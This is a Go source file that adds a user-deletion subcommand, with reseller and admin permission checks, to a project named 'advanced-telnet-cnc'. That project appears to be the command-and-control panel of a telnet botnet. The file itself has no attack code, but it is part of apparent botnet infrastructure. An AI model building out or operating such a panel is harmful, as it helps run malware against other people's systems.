package subcommands

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"errors"
	"strconv"
)

func init() {
	command.Subcommand("users", &command.SubCommand{
		Aliases:   []string{"delete", "remove"},
		Arguments: []command.Argument{{"username", false}},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *command.Command) error {
			profile, err := database.UserFromName(args[0])
			if err != nil {
				return session.CmdError(err)
			}

			if profile == session.UserProfile || profile.Name == "admin" || (session.Reseller && profile.Admin) {
				return session.CmdError(errors.New("not allowed to remove"))
			}

			err = profile.Remove()
			if err != nil {
				return session.CmdError(err)
			}

			return session.Printf("%sSuccessfully removed %s from the database.\r\n", config.Green, strconv.Quote(profile.Name))
		},
	})
}
